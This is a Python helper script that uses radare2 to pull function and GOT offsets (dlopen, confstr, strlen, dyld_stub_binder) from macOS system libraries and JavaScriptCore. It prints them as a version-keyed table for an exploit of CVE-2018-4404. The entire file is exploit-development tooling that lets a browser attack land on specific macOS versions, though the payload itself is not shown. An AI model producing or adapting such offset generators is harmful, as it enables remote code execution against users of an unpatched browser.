#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Generate offsets for CVE-2018-4404 exploit

Requirements:
- radare2 must be installed:
  brew install radare2  # or
  git clone https://github.com/radare/radare2 && cd radare2 && ./sys/install.sh
"""

import re
import subprocess
import sys


def grab_offset(lib_file, function):
    """Extract function offset using radare2"""
    try:
        offset_string = subprocess.check_output(
            ['r2', '-2qQ', '-c', f'aa; afl | grep {function}', lib_file],
            encoding='utf-8'
        ).strip()
        return offset_string[:10]
    except subprocess.CalledProcessError as e:
        print(f"Error running r2: {e}", file=sys.stderr)
        return "0x00000000"


def main():
    try:
        version = subprocess.check_output(['sw_vers', '-productVersion'], encoding='utf-8').strip()
    except subprocess.CalledProcessError as e:
        print(f"Error getting macOS version: {e}", file=sys.stderr)
        sys.exit(1)
    
    print(f"      '{version}' => {{")
    print(f"        :dyld_stub_loader => '{grab_offset('/usr/lib/system/libdyld.dylib', 'dyld_stub_binder')}',")
    print(f"        :dlopen => '{grab_offset('/usr/lib/system/libdyld.dylib', 'sym._dlopen')}',")
    print(f"        :confstr => '{grab_offset('/usr/lib/system/libsystem_c.dylib', 'sym._confstr')}',")
    print(f"        :strlen => '{grab_offset('/usr/lib/system/libsystem_c.dylib', 'sym._strlen')}',")
    
    try:
        strlen_disasm = subprocess.check_output(
            ['r2', '-2qQ', '-c', 
             'iS | grep nl_symbol_ptr; s sym.imp.strlen; pd 1',
             '/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore'],
            encoding='utf-8'
        ).strip()
        
        # Parse the disassembly output
        lines = strlen_disasm.split('\n')
        for line in lines:
            parts = line.split()
            if len(parts) >= 4 and parts[0].isdigit():
                got_offset = int(parts[3], 16)
                break
        else:
            got_offset = 0
        
        # Extract address from brackets [0xaddress]
        match = re.search(r'\[(\S+)\]', strlen_disasm)
        if match:
            strlen_got_entry = int(match.group(1), 16)
            strlen_got_offset = hex(strlen_got_entry - got_offset)[2:]
            print(f"        :strlen_got => '0x{strlen_got_offset}',")
        else:
            print("        :strlen_got => '0x00000000',")
    except subprocess.CalledProcessError as e:
        print(f"Error analyzing JavaScriptCore: {e}", file=sys.stderr)
        print("        :strlen_got => '0x00000000',")
    
    print("      },")


if __name__ == "__main__":
    main()
